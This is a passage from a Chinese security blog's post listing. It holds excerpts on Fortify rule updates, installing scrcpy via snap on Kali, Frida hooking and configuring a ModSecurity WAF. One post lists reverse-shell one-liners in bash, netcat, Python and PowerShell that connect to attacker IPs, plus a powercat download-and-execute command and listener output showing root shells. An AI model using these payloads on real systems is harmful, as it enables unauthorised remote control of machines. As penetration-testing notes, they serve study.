<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Extended</span><span class="p">,</span> <span class="p">.</span><span class="nx">NET</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">Java</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">Ruby</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">ColdFusion</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Fortify</span> <span class="nx">Secure</span> <span class="nx">Coding</span> <span class="nx">Rules</span><span class="p">,</span> <span class="nx">Core</span><span class="p">,</span> <span class="nx">Python</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
<span class="nx">Removing</span> <span class="nx">Old</span> <span class="nx">Metadata</span> <span class="nx">Files</span> <span class="p">...</span>
<span class="nx">E</span><span class="p">:</span><span class="err">\</span><span class="nx">fortify</span><span class="err">\</span><span class="nx">Core</span><span class="err">\</span><span class="nx">config</span><span class="err">\</span><span class="nx">ExternalMetadata</span>
<span class="nx">Main</span> <span class="nx">External</span> <span class="nx">List</span> <span class="nx">Mappings</span> <span class="nx">v2019</span><span class="p">.</span><span class="mf">1.0</span><span class="p">.</span><span class="mi">0007</span>
<span class="nx">Storing</span> <span class="nx">Updated</span> <span class="nx">Metadata</span> <span class="nx">Files</span> <span class="p">...</span>
<span class="nx">E</span><span class="p">:</span><span class="err">\</span><span class="nx">fortify</span><span class="err">\</span><span class="nx">Core</span><span class="err">\</span><span class="nx">config</span><span class="err">\</span><span class="nx">ExternalMetadata</span>
<span class="nx">Main</span> <span class="nx">External</span> <span class="nx">List</span> <span class="nx">Mappings</span> <span class="nx">v2015</span><span class="p">.</span><span class="mf">2.0</span><span class="p">.</span><span class="mi">0008</span>
</code></pre></div></div>

<h1 id="结果">结果</h1>

<p>配置完就可以愉快地使用fortify进行机器扫描分析代码了。</p>

<p><code class="language-plaintext highlighter-rouge">敬上。感谢您的阅读</code><br /></p>

<p>参考：<br />
<a href="https://stackoverflow.com/questions/18209159/fortify-error-no-rules-file-found"> Fortify Error : “No rules file found”</a></p>


          <p><a href="/blog/2020/fortify/no-fules-file/found/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/scrcpy/"><h3 class="ctitle">「scrcpy」:Linux中优秀的投屏软件～</h3></a>
          <p><csmall>Dec 31, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># apt install snapd</span>
正在读取软件包列表... 完成
正在分析软件包的依赖关系树       
正在读取状态信息... 完成       
snapd 已经是最新版 <span class="o">(</span>2.42.1-1<span class="o">)</span>。
升级了 0 个软件包，新安装了 0 个软件包，要卸载 0 个软件包，有 26 个软件包未被升级
<span class="nb">sudo </span>snap <span class="nb">install </span>scrcpy.snap <span class="nt">--dangerous</span>
</code></pre></div></div>

<p>由于直接设置 http_proxy 环境变量无法设置上, 作者在 snapd 中直接设置proxy, 方法如下:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># 前置操作, 修改  systemctl edit 使用的编辑器为 VIM, 如果不介意 Nano 可以跳过这一步</span>
<span class="nv">$ </span><span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/profile <span class="o">&lt;&lt;-</span><span class="sh">'</span><span class="no">EOF</span><span class="sh">' 
export SYSTEMD_EDITOR="/bin/vim"
</span><span class="no">EOF
</span><span class="nv">$ </span><span class="nb">source</span> /etc/profile

<span class="c"># 开始设置代理</span>
<span class="nv">$ </span><span class="nb">sudo </span>systemctl edit snapd
加上：
<span class="o">[</span>Service]
<span class="nv">Environment</span><span class="o">=</span><span class="s2">"http_proxy=http://127.0.0.1:port"</span>
<span class="nv">Environment</span><span class="o">=</span><span class="s2">"https_proxy=http://127.0.0.1:port"</span>
</code></pre></div></div>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>systemctl daemon-reload
<span class="nv">$ </span><span class="nb">sudo </span>systemctl restart snapd
</code></pre></div></div>
<p>实测相当有效</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/usr/local/scrcpy-test/scrcpy# <span class="nb">sudo </span>snap <span class="nb">install </span>scrcpy
2019-12-31T11:28:41+08:00 INFO Waiting <span class="k">for </span>restart...
Download snap <span class="s2">"core18"</span> <span class="o">(</span>1288<span class="o">)</span> from channel <span class="s2">"stable"</span>             11% 14.7kB/s 57.7m^C^C^Z
<span class="o">[</span>2]+  已停止               <span class="nb">sudo </span>snap <span class="nb">install </span>scrcpy
</code></pre></div></div>
<p>如上下所示，速度快了十倍～十倍的快乐～</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/usr/local/scrcpy-test/scrcpy# <span class="nb">sudo </span>snap <span class="nb">install </span>scrcpy
2019-12-31T11:36:30+08:00 INFO Waiting <span class="k">for </span>restart...
Download snap <span class="s2">"scrcpy"</span> <span class="o">(</span>199<span class="o">)</span> from channel <span class="s2">"stable"</span>               7%  129kB/s 9m51s
Warning: /snap/bin was not found <span class="k">in </span>your <span class="nv">$PATH</span><span class="nb">.</span> If you<span class="s1">'ve not restarted your session since you
         installed snapd, try doing that. Please see https://forum.snapcraft.io/t/9469 for more
         details.

scrcpy v1.12 from sisco311 installed
</span></code></pre></div></div>
<p>scrcpy投屏需要usb调试权限；
具体步骤为[开发者模式]-[打开usb调试]
否则会报错：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~# scrcpy
INFO: scrcpy 1.12 &lt;https://github.com/Genymobile/scrcpy&gt;
adb: error: failed to get feature <span class="nb">set</span>: no devices/emulators found
ERROR: <span class="s2">"adb push"</span> returned with value 1
</code></pre></div></div>

<p>报错如下：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/snap/bin# ./scrcpy
cannot change profile <span class="k">for </span>the next <span class="nb">exec </span>call: No such file or directory
snap-update-ns failed with code 1: No such file or directory
查看版本：
root@kali:~# snap version
snap    2.42.5
snapd   2.42.5
series  16
kali    2019.4
kernel  5.3.0-kali3-amd64
root@kali:~# snap version
snap    2.42.5
snapd   2.42.5
series  16
kali    2019.4
kernel  5.3.0-kali3-amd64
</code></pre></div></div>
<p>解决：</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:/var/lib/snapd/apparmor/profiles# apparmor_parser <span class="nt">-r</span> /var/lib/snapd/apparmor/profiles/
</code></pre></div></div>

<p>参考<br /></p>

<p><a href="https://kuricat.com/gist/snap-install-too-slow-zmbjy">
snapInstall.md;snap安装过慢解决方案</a></p>

<p><a href="https://forum.snapcraft.io/t/snap-update-ns-failing-cannot-launch-snaps/11956">
Snap-update-ns failing, cannot launch snaps;linux重启后启动scrcpy，snap报错</a></p>

          <p><a href="/blog/2019/scrcpy/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/shell/reserve/back/"><h3 class="ctitle">「笔记」：反弹shell的几种方法</h3></a>
          <p><csmall>Dec 30, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <p>记录：关于bash shell的反弹:)随笔记<br />
假定环境：</p>
<ul>
  <li>
    <table>
      <tbody>
        <tr>
          <td>kali被攻击机器；ip:192.168.3.32</td>
          <td>iZj6cgn7odv59wmjjhe6zwZ攻击机；ip:47.52.233.92</td>
        </tr>
      </tbody>
    </table>
  </li>
</ul>

<h2 id="1bash">1.bash</h2>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">bash</span> <span class="o">-</span><span class="nx">i</span> <span class="o">&gt;&amp;</span><span class="sr">/dev/</span><span class="nx">tcp</span><span class="o">/</span><span class="mf">47.52</span><span class="p">.</span><span class="mf">233.92</span><span class="o">/</span><span class="mi">1234</span> <span class="mi">0</span><span class="o">&gt;&amp;</span> <span class="mi">1</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">1234</span>
<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1234</span><span class="p">)</span>
<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">223.240</span><span class="p">.</span><span class="mf">212.236</span> <span class="mi">37798</span> <span class="nx">received</span><span class="o">!</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">whoami</span> 
<span class="nx">whoami</span>
<span class="nx">root</span>
<span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">ifconfig</span>    
<span class="nx">ifconfig</span>
<span class="nx">eth0</span><span class="p">:</span> <span class="nx">flags</span><span class="o">=</span><span class="mi">4099</span><span class="o">&lt;</span><span class="nx">UP</span><span class="p">,</span><span class="nx">BROADCAST</span><span class="p">,</span><span class="nx">MULTICAST</span><span class="o">&gt;</span>  <span class="nx">mtu</span> <span class="mi">1500</span>
        <span class="nx">ether</span> <span class="mi">1</span><span class="nx">c</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">47</span><span class="p">:</span><span class="nx">e5</span><span class="p">:</span><span class="nx">d0</span><span class="p">:</span><span class="mi">0</span><span class="nx">d</span>  <span class="nx">txqueuelen</span> <span class="mi">1000</span>  <span class="p">(</span><span class="nx">Ethernet</span><span class="p">)</span>
        <span class="nx">RX</span> <span class="nx">packets</span> <span class="mi">0</span>  <span class="nx">bytes</span> <span class="mi">0</span> <span class="p">(</span><span class="mf">0.0</span> <span class="nx">B</span><span class="p">)</span>
        <span class="nx">RX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span>  <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">frame</span> <span class="mi">0</span>
        <span class="nx">TX</span> <span class="nx">packets</span> <span class="mi">0</span>  <span class="nx">bytes</span> <span class="mi">0</span> <span class="p">(</span><span class="mf">0.0</span> <span class="nx">B</span><span class="p">)</span>
        <span class="nx">TX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span> <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">carrier</span> <span class="mi">0</span>  <span class="nx">collisions</span> <span class="mi">0</span>

<span class="nx">lo</span><span class="p">:</span> <span class="nx">flags</span><span class="o">=</span><span class="mi">73</span><span class="o">&lt;</span><span class="nx">UP</span><span class="p">,</span><span class="nx">LOOPBACK</span><span class="p">,</span><span class="nx">RUNNING</span><span class="o">&gt;</span>  <span class="nx">mtu</span> <span class="mi">65536</span>
        <span class="nx">inet</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span>  <span class="nx">netmask</span> <span class="mf">255.0</span><span class="p">.</span><span class="mf">0.0</span>
        <span class="nx">inet6</span> <span class="p">::</span><span class="mi">1</span>  <span class="nx">prefixlen</span> <span class="mi">128</span>  <span class="nx">scopeid</span> <span class="mh">0x10</span><span class="o">&lt;</span><span class="nx">host</span><span class="o">&gt;</span>
        <span class="nx">loop</span>  <span class="nx">txqueuelen</span> <span class="mi">1000</span>  <span class="p">(</span><span class="nx">Local</span> <span class="nx">Loopback</span><span class="p">)</span>
        <span class="nx">RX</span> <span class="nx">packets</span> <span class="mi">132196</span>  <span class="nx">bytes</span> <span class="mi">121378334</span> <span class="p">(</span><span class="mf">115.7</span> <span class="nx">MiB</span><span class="p">)</span>
        <span class="nx">RX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span>  <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">frame</span> <span class="mi">0</span>
        <span class="nx">TX</span> <span class="nx">packets</span> <span class="mi">132196</span>  <span class="nx">bytes</span> <span class="mi">121378334</span> <span class="p">(</span><span class="mf">115.7</span> <span class="nx">MiB</span><span class="p">)</span>
        <span class="nx">TX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span> <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">carrier</span> <span class="mi">0</span>  <span class="nx">collisions</span> <span class="mi">0</span>

<span class="nx">wlan0</span><span class="p">:</span> <span class="nx">flags</span><span class="o">=</span><span class="mi">4163</span><span class="o">&lt;</span><span class="nx">UP</span><span class="p">,</span><span class="nx">BROADCAST</span><span class="p">,</span><span class="nx">RUNNING</span><span class="p">,</span><span class="nx">MULTICAST</span><span class="o">&gt;</span>  <span class="nx">mtu</span> <span class="mi">1500</span>
        <span class="nx">inet</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.32</span>  <span class="nx">netmask</span> <span class="mf">255.255</span><span class="p">.</span><span class="mf">255.0</span>  <span class="nx">broadcast</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">3.255</span>
        <span class="nx">inet6</span> <span class="nx">fe80</span><span class="p">::</span><span class="nx">c895</span><span class="p">:</span><span class="mi">5</span><span class="nx">ca5</span><span class="p">:</span><span class="mi">529</span><span class="nx">a</span><span class="p">:</span><span class="nx">eef3</span>  <span class="nx">prefixlen</span> <span class="mi">64</span>  <span class="nx">scopeid</span> <span class="mh">0x20</span><span class="o">&lt;</span><span class="nx">link</span><span class="o">&gt;</span>
        <span class="nx">ether</span> <span class="mi">68</span><span class="p">:</span><span class="mi">07</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="nx">d5</span><span class="p">:</span><span class="mi">46</span><span class="p">:</span><span class="mi">16</span>  <span class="nx">txqueuelen</span> <span class="mi">1000</span>  <span class="p">(</span><span class="nx">Ethernet</span><span class="p">)</span>
        <span class="nx">RX</span> <span class="nx">packets</span> <span class="mi">140963</span>  <span class="nx">bytes</span> <span class="mi">101469044</span> <span class="p">(</span><span class="mf">96.7</span> <span class="nx">MiB</span><span class="p">)</span>
        <span class="nx">RX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">15</span>  <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">frame</span> <span class="mi">0</span>
        <span class="nx">TX</span> <span class="nx">packets</span> <span class="mi">86373</span>  <span class="nx">bytes</span> <span class="mi">16895892</span> <span class="p">(</span><span class="mf">16.1</span> <span class="nx">MiB</span><span class="p">)</span>
        <span class="nx">TX</span> <span class="nx">errors</span> <span class="mi">0</span>  <span class="nx">dropped</span> <span class="mi">0</span> <span class="nx">overruns</span> <span class="mi">0</span>  <span class="nx">carrier</span> <span class="mi">0</span>  <span class="nx">collisions</span> <span class="mi">0</span>
</code></pre></div></div>

<h2 id="2netcat">2.netcat</h2>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">e</span> <span class="o">/</span><span class="nx">bin</span><span class="o">/</span><span class="nx">sh</span> <span class="mf">47.52</span><span class="p">.</span><span class="mf">233.92</span> <span class="mi">1234</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">1234</span>
<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1234</span><span class="p">)</span>
<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">223.240</span><span class="p">.</span><span class="mf">212.236</span> <span class="mi">37812</span> <span class="nx">received</span><span class="o">!</span>
<span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import pty;pty.spawn("/bin/sh")</span><span class="dl">'</span>
<span class="err">#</span> <span class="nx">whoami</span>
<span class="nx">whoami</span>
<span class="nx">root</span>
<span class="err">#</span> 
</code></pre></div></div>

<h2 id="3python">3.python</h2>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">kali</span><span class="p">:</span><span class="o">/</span><span class="err">#</span> <span class="nx">python</span> <span class="o">-</span><span class="nx">c</span> <span class="dl">'</span><span class="s1">import socket,
subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("47.52.233.92",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);</span><span class="dl">'</span>
</code></pre></div></div>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">root</span><span class="p">@</span><span class="nd">iZj6cgn7odv59wmjjhe6zwZ</span><span class="p">:</span><span class="o">~</span><span class="err">#</span> <span class="nx">nc</span> <span class="o">-</span><span class="nx">lvvp</span> <span class="mi">1234</span>
<span class="nx">Listening</span> <span class="nx">on</span> <span class="p">[</span><span class="mf">0.0</span><span class="p">.</span><span class="mf">0.0</span><span class="p">]</span> <span class="p">(</span><span class="nx">family</span> <span class="mi">0</span><span class="p">,</span> <span class="nx">port</span> <span class="mi">1234</span><span class="p">)</span>
<span class="nx">Connection</span> <span class="k">from</span> <span class="mf">223.240</span><span class="p">.</span><span class="mf">212.236</span> <span class="mi">37820</span> <span class="nx">received</span><span class="o">!</span>
<span class="err">#</span> <span class="nx">whoami</span>
<span class="nx">root</span>
<span class="err">#</span> <span class="nx">id</span>
<span class="nx">uid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">gid</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span> <span class="nx">组</span><span class="o">=</span><span class="mi">0</span><span class="p">(</span><span class="nx">root</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="4powershell构造函数反弹shell">4.powershell构造函数反弹shell</h2>
<p>实际反弹shell中成功的；应用场景：
1.WINDOWS系统
2.上传木马成功，但是没有交互式shell</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell.exe <span class="nt">-nop</span> <span class="nt">-c</span> <span class="s2">"</span><span class="nv">$client</span><span class="s2"> = New-Object Net.Sockets.TCPClient('117.64.238.192',11223);</span><span class="nv">$stream</span><span class="s2"> = </span><span class="nv">$client</span><span class="s2">.GetStream();[byte[]]</span><span class="nv">$bytes</span><span class="s2"> = 0..65535|%{0};while((</span><span class="nv">$i</span><span class="s2"> = </span><span class="nv">$stream</span><span class="s2">.Read(</span><span class="nv">$bytes</span><span class="s2">, 0, </span><span class="nv">$bytes</span><span class="s2">.Length)) -ne 0){;</span><span class="nv">$data</span><span class="s2"> = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(</span><span class="nv">$bytes</span><span class="s2">,0, </span><span class="nv">$i</span><span class="s2">);</span><span class="nv">$sendback</span><span class="s2"> = (iex </span><span class="nv">$data</span><span class="s2"> 2&gt;&amp;1 | Out-String );</span><span class="nv">$sendback2</span><span class="s2"> = </span><span class="nv">$sendback</span><span class="s2"> + 'PS ' + (pwd).Path + '&gt; ';</span><span class="nv">$sendbyte</span><span class="s2"> = ([text.encoding]::ASCII).GetBytes(</span><span class="nv">$sendback2</span><span class="s2">);</span><span class="nv">$stream</span><span class="s2">.Write(</span><span class="nv">$sendbyte</span><span class="s2">,0,</span><span class="nv">$sendbyte</span><span class="s2">.Length);</span><span class="nv">$stream</span><span class="s2">.Flush()};</span><span class="nv">$client</span><span class="s2">.Close()"</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell IEX <span class="o">(</span>New-Object System.Net.Webclient<span class="o">)</span>.DownloadString
<span class="o">(</span><span class="s1">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="o">)</span><span class="p">;</span>
powercat <span class="nt">-c</span> 47.52.233.92 <span class="nt">-p</span> 11223 <span class="nt">-e</span> cmd
</code></pre></div></div>

<p>meterpreter可以直接开启</p>

<p>run getui -e</p>

<p>然后用rdesktop就能直接连了</p>

          <p><a href="/blog/2019/shell/reserve/back/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/HOOK/BY/FRIDA/"><h3 class="ctitle">「安卓渗透」:HOOK-Frida原理详解</h3></a>
          <p><csmall>Dec 26, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="hook详解">HOOK详解</h2>

<p>hook技术是指在android上进行的跨进程操作，包括
一、native层hook，即：jni，本地调用java native interface，称之为本层hook；
二、java本地接口
三、java层hook</p>

<ul>
  <li>
    <p>实际上，Android本身进行且维护着一套事件分发机制，而应用程序则包括<code class="language-plaintext highlighter-rouge">应用触发事件</code>和<code class="language-plaintext highlighter-rouge">后台逻辑处理</code></p>

    <ul>
      <li>
        <p>壹.应用触发事件：比如app中，一个按钮对应一个url，点击则跳转默认浏览器访问url，称之为应用触发事件；</p>
      </li>
      <li>
        <p>贰.后台逻辑处理：我们所看不到的后台处理逻辑程序;
<br />
比如上个栗子中：一个url按钮，我们点击后用户所看到的现象为：
按钮点击-&gt;跳转默认浏览器-&gt;浏览器地址栏填充为按钮url-&gt;访问；而对于后台来说，那么可能就没有那么简单了，当我们学会去看log日志的时候，我们会发现，后台代码程序所做的工作多得多得多。</p>
      </li>
    </ul>
  </li>
</ul>

          <p><a href="/blog/2019/HOOK/BY/FRIDA/">[Read More]</a></p>
        </div>
        
      </div>
      <div class="hline"></div>

      <div class="spacing"></div>
      
      <! -- Blog Post -->
      <div class="row">
        <div class="col-lg-12">
          <a href="/blog/2019/ABOUT/Modsec/waf/"><h3 class="ctitle">Mod-Security：有关「WAF」的爱恨情仇</h3></a>
          <p><csmall>Dec 25, 2019. | By: Bin4xin</csmall></p>
        </div>

        
        <div class="col-log-12">
          <h2 id="目录">目录</h2>
<ul>
  <li><a href="#%E6%9C%9D%E8%8A%B1%E5%A4%95%E6%8B%BE">“朝花夕拾”</a></li>
  <li><a href="#1%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83">1.运行环境</a></li>
  <li><a href="#2%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE">2.安装配置</a></li>
  <li><a href="#3%E8%A7%84%E5%88%99%E5%BA%93%E9%85%8D%E7%BD%AE">3.规则库配置</a></li>
  <li><a href="#4%E6%80%BB%E7%BB%93">4.总结</a></li>
</ul>

<p><strong>添加于2021/02/05</strong></p>

<h2 id="朝花夕拾">“朝花夕拾”</h2>

<p>这篇与WAF相关”技术”博客其实没有多少技术含量，只是当时刚刚接触到WAF，感觉非常的新鲜然后有了这篇博客，其实当时连LINUX基础常识都还不是非常的了解，
年少轻狂的来配置WAF肯定无法成功；现在回头来看当时的文笔还是较为稚嫩，通篇都是一些”转述”的代码块，没有自己的相关思想，是很糟糕的一篇博客。</p>

<p>刚好年底总结博客，总结到WAF这一块，正好把这一篇的文章给补上，整理文章可以查看，较于下面这篇文章，主要增加了自定义规则库的配置和相关验证，可通过上方目录链接直接跳转：</p>

<ul>
  <li><a href="https://about.sentrylab.cn/help/Mod-Waf-Bypass-Walkthrough/">「分享」ModsecWAF：老牌开源waf的绕过历程</a></li>
</ul>

<p>正好把这篇文章收个尾，我的有些文章写到一半，写不下去了就放着了。这个习惯不是很好。</p>

<hr />
<p><strong>记一次waf配置经历。忙里偷闲，正好有闲置的服务器，自己动动手配置看看。</strong></p>

<h2 id="1运行环境">1.运行环境</h2>
<ul>
  <li><del>nginx-1.14.0（apt自动化安装）</del></li>
  <li>
    <p>经过实际操作验证，这里建议各位使用nginx1.13.8版本；源码包下载链接<code class="language-plaintext highlighter-rouge">wget http://nginx.org/download/nginx-1.13.8.tar.gz</code></p>
  </li>
  <li>ubuntu 18.04</li>
</ul>

<h2 id="2安装配置">2.安装配置</h2>

<p>安装的过程大致是这样的一个过程：</p>

<ul>
  <li>1、<strong>ModWAF编译安装</strong>
    <ul>
      <li>
        <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">git</span> <span class="nx">clone</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//github.com/SpiderLabs/ModSecurity</span>
</code></pre></div>        </div>
      </li>
      <li>nginx版本，教程中推荐的1.9版本实际操作下来无法成功在UBUNTU18下编译安装，这里推荐<code class="language-plaintext highlighter-rouge">nginx/1.13.8</code>或者更高，极力推荐<strong>nginx/1.18.0</strong>
        <ul>
          <li><code class="language-plaintext highlighter-rouge">wget http://nginx.org/download/nginx-1.13.8.tar.gz</code></li>
        </ul>
      </li>
      <li>环境lib库安装：
        <ul>
          <li><code class="language-plaintext highlighter-rouge">sudo apt-get install openssl libssl-dev libpcre3 libpcre3-dev zlib1g-dev autoconf automake libtool gcc g++ make</code></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>2、<strong>编译安装NGINX</strong>
    <ul>
      <li>注意编译安装时添加nginx连接器：
        <ul>
          <li>
            <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  git clone https://github.com/SpiderLabs/ModSecurity-nginx.git modsecurity-nginx
  ./configure <span class="nt">--add-module</span><span class="o">=</span>/path/to/modsecurity-nginx
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>NGINX WEB SERVER块配置：
        <ul>
          <li>
            <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="nx">server</span> <span class="p">{</span>
            
  <span class="nx">listen</span> <span class="mi">8077</span><span class="p">;</span>
            
  <span class="nx">location</span> <span class="o">/</span> <span class="p">{</span>
            
      <span class="nx">default_type</span> <span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">;</span>
            
      <span class="k">return</span> <span class="mi">200</span> <span class="dl">"</span><span class="s2">Thank you for requesting ${request_uri}</span><span class="se">\n</span><span class="dl">"</span><span class="p">;</span>
            
      <span class="p">}</span>
            
  <span class="p">}</span>
</code></pre></div>            </div>
          </li>
        </ul>
      </li>
      <li>效果图：
        <ul>
          <li><img src="/assets/img/blog/2019/NGINX-WAF-TEST-PAGES.PNG" alt="NGINX-WAF-TEST-PAGES" /></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>3、防护规则自写并测试：
    <ul>
      <li>下载ModSecurity配置文件，我的NGINX目录在<code class="language-plaintext highlighter-rouge">/usr/local/nginx</code>下，所以我的命令如下；
        <ul>
          <li>
            <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">cd</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">local</span><span class="o">/</span><span class="nx">nginx</span> <span class="o">&amp;&amp;</span> <span class="nx">mkdir</span> <span class="nx">modsec</span> <span class="o">&amp;&amp;</span> <span class="nx">cd</span> <span class="nx">modsec</span>
<span class="nx">wget</span> <span class="nx">https</span><span class="p">:</span><span class="c1">//raw.githubusercontent.com/SpiderLabs/ModSecurity/v3/master/modsecurity.conf-recommended</span>
<span class="nx">mv</span> <span class="nx">modsecurity</span><span class="p">.</span><span class="nx">conf</span><span class="o">-</span><span class="nx">recommended</span> <span class="nx">modsecurity</span><span class="p">.</span><span class="nx">conf</span>
<span class="nx">vim</span> <span class="nx">modsecurity</span><span class="p">.</span><span class="nx">conf</span>
<span class="nx">修改SecRuleEngine</span> <span class="nx">DetectionOnly为SecRuleEngine</span> <span class="nx">On</span>
          
<span class="nx">同样</span><span class="err">，</span><span class="nx">添加配置</span><span class="err">：</span>
<span class="nx">vim</span> <span class="nx">main</span><span class="p">.</span><span class="nx">conf</span>
<span class="nx">内容为</span><span class="err">：</span>
